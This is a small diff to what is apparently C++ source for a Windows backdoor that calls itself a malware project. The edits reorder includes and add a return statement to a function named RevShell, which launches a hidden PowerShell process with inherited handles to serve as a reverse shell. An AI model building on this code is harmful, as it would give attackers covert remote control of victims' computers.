@@ -26,11 +26,10 @@ it is not a fully featured Malware product.
 #include <stdlib.h>
 #include <iostream>
 #include <fstream>
+#include <winsock2.h>
 #include <windows.h>
 #include <winuser.h>
 #include <bits/stdc++.h>
-
-#include <winsock2.h>
 #include <io.h>
 #include <process.h>
 #include <sys/types.h>
@@ -219,7 +218,7 @@ int RevShell(void){
     //iso forbids converting string constant to lpstr -wwrite-strings (aka char*)
 	char PowerShell[]= "PowerShell";
 	CreateProcessA(NULL,PowerShell, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
-    
+    return 0;
     
 }
 /*########################################### MAIN FUNCTION #####################################################*/
